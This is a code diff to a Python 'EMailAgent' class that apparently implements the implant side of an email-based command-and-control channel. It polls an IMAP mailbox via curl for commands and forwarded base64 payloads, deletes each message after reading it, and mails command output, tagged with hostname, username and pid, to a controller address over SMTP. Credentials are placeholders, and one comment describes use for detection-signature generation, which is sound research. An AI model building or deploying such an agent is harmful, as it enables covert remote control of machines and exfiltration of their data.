@@ -28,11 +28,11 @@ class SimpleEmail:
 
 class EMailAgent(LocalAgent):
 	OUTGOING_EMAIL_TMP_FILENAME = "tmp.txt";
-	EMAIL_OUTGOING_URL = "FILL ME";
-	IMAP_EMAIL_URL = "FILL ME";
-	EMAIL_OUTGOING_USERNAME = "FILL ME";
-	EMAIL_OUTGOING_PASSWORD = "FILL ME";
-	EMAIL_CMD_ADDR = "FILL ME";
+	EMAIL_OUTGOING_URL = "<FILL>";
+	IMAP_EMAIL_URL = "<FILL>";
+	EMAIL_OUTGOING_USERNAME = "<FILL>";
+	EMAIL_OUTGOING_PASSWORD = "<FILL>";
+	EMAIL_CMD_ADDR = "<FILL>";
 
 	EMAIL_PROTOCOL_TAG = "SMTP";
 
@@ -75,10 +75,8 @@ class EMailAgent(LocalAgent):
 				self.forwardQueues[forwardID].put(email.body)
 			else:
 				self.q.put(email.body)
-			return "Found"
 		except Exception as e:
-			print("Oops, something went wrong in processNextEmail: {}".format(e), file=sys.stderr)
-			print("Releasing");            
+			#print("Oops, something went wrong in processNextEmail: {}".format(e), file=sys.stderr)
 			self.curlLock.release()
 			return "No email"
 
@@ -91,7 +89,7 @@ class EMailAgent(LocalAgent):
 			return None
 		else:
 			b64Forward = self.forwardQueues[forwardID].get()
-			print(b64Forward)
+			#print(b64Forward)
 			return base64.decodebytes(b64Forward.encode('ascii'))    
 
 	def buildEmailSubject(self, hostname, username, pid, protocol):
@@ -107,7 +105,13 @@ class EMailAgent(LocalAgent):
 		f.write(body)    
 		f.close()
 		sendEmailCommand = "curl --url " + self.EMAIL_OUTGOING_URL + " --user " + self.EMAIL_OUTGOING_USERNAME + ":" + self.EMAIL_OUTGOING_PASSWORD + " --mail-from " + self.EMAIL_OUTGOING_USERNAME + " --mail-rcpt " + self.EMAIL_CMD_ADDR + " --upload-file " + self.OUTGOING_EMAIL_TMP_FILENAME
-		sendEmailResponse = subprocess.Popen(sendEmailCommand, shell=True, stdout=subprocess.PIPE).stdout.read().decode("utf-8")
+		processTmp = subprocess.Popen(sendEmailCommand, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+		sendEmailResponseErr = processTmp.stderr.read().decode("utf-8")
+		#Data lossyness is considered acceptable. If this code is ever used for something other than signature generation, IE, if persistence
+        #of data is ever actually important, then some sort of queuing mechanism will be necessary to ensure data is not lost.
+        #For now, fix the connection problem and restart the test scenario.
+		if "curl: (" in sendEmailResponseErr:
+			print("Cannot transmit email: " + sendEmailResponseErr)
 		os.remove(self.OUTGOING_EMAIL_TMP_FILENAME)
 		self.curlLock.release()
 
@@ -123,8 +127,21 @@ class EMailAgent(LocalAgent):
 		self.sendEmail(subject, cmd_output);
 	
 	def getNextEmail(self):
-		grabMeta = "curl " + self.IMAP_EMAIL_URL + "/inbox;UID=1 -u " + self.EMAIL_OUTGOING_USERNAME + ":" + self.EMAIL_OUTGOING_PASSWORD
-		cmd_output = subprocess.Popen(grabMeta, shell=True, stdout=subprocess.PIPE).stdout.read().decode("utf-8")
+		grabUIDInference = "curl " + self.IMAP_EMAIL_URL + "/inbox -u " + self.EMAIL_OUTGOING_USERNAME + ":" + self.EMAIL_OUTGOING_PASSWORD + " --request \"EXAMINE INBOX\""
+		cmd_output = subprocess.Popen(grabUIDInference, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.read().decode("utf-8")
+		if not cmd_output:
+			raise
+		lines = cmd_output.split("\n")
+		if(len(lines) < 8):
+			raise
+		current_messages = int(lines[3].split()[1])
+		next_UID = lines[7].split()[3]
+		next_UID = next_UID[:-1]#Remove last character
+		next_UID = int(next_UID)
+		tUID = next_UID - current_messages
+        
+		grabMeta = "curl " + self.IMAP_EMAIL_URL + "/inbox;UID=" + str(tUID) + " -u " + self.EMAIL_OUTGOING_USERNAME + ":" + self.EMAIL_OUTGOING_PASSWORD
+		cmd_output = subprocess.Popen(grabMeta, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.read().decode("utf-8")
 		if not cmd_output:
 			raise
 	
@@ -143,33 +160,25 @@ class EMailAgent(LocalAgent):
 			raise
     
 		#Get Body
-		getFirstEmailBodyCmd =  "curl " + self.IMAP_EMAIL_URL + "/inbox;UID=1/;SECTION=TEXT -u " + self.EMAIL_OUTGOING_USERNAME + ":" + self.EMAIL_OUTGOING_PASSWORD
-		body = subprocess.Popen(getFirstEmailBodyCmd, shell=True, stdout=subprocess.PIPE).stdout.read().decode("utf-8")
+		getFirstEmailBodyCmd =  "curl " + self.IMAP_EMAIL_URL + "/inbox;UID=" + str(tUID) + "/;SECTION=TEXT -u " + self.EMAIL_OUTGOING_USERNAME + ":" + self.EMAIL_OUTGOING_PASSWORD
+		body = subprocess.Popen(getFirstEmailBodyCmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.read().decode("utf-8")
 		if (body[len(body) - 1] == '\n'):
 			body = body[0: len(body) - 1];
 		if (body[len(body) - 1] == '\r'):
 			body = body[0: len(body) - 1];
 
-		delCmdOne = "curl " + self.IMAP_EMAIL_URL + "/inbox;UID=1 -u " + self.EMAIL_OUTGOING_USERNAME + ":" + self.EMAIL_OUTGOING_PASSWORD + " -X \"STORE 1 +Flags \\Deleted\""
+		delCmdOne = "curl " + self.IMAP_EMAIL_URL + "/inbox;UID=" + str(tUID) + " -u " + self.EMAIL_OUTGOING_USERNAME + ":" + self.EMAIL_OUTGOING_PASSWORD + " -X \"STORE 1 +Flags \\Deleted\""
 	
 		#To delete, two step process:
-		delCmdOneResponse = subprocess.Popen(delCmdOne, shell=True, stdout=subprocess.PIPE).stdout.read().decode("utf-8")
+		delCmdOneResponse = subprocess.Popen(delCmdOne, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.read().decode("utf-8")
 	
-		delCmdTwo = "curl " + self.IMAP_EMAIL_URL + "/inbox;UID=1 -u " + self.EMAIL_OUTGOING_USERNAME + ":" + self.EMAIL_OUTGOING_PASSWORD + " -X \"EXPUNGE\""
-		delCmdTwoResponse = subprocess.Popen(delCmdTwo, shell=True, stdout=subprocess.PIPE).stdout.read().decode("utf-8")
+		delCmdTwo = "curl " + self.IMAP_EMAIL_URL + "/inbox;UID=" + str(tUID) + " -u " + self.EMAIL_OUTGOING_USERNAME + ":" + self.EMAIL_OUTGOING_PASSWORD + " -X \"EXPUNGE\""
+		delCmdTwoResponse = subprocess.Popen(delCmdTwo, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.read().decode("utf-8")
 	
 		return SimpleEmail(sender, subject, body);    
     
 	def pollServer(self):
-		"""
-		try:
-			email = self.getNextEmail()
-			return email.body
-		except Exception as e:
-			return "<control> No Command"  
-		"""
 		if self.q.empty():
-			print("Processing next email")
 			self.processNextEmail()
 		if self.q.empty():
 			return "<control> No Command"
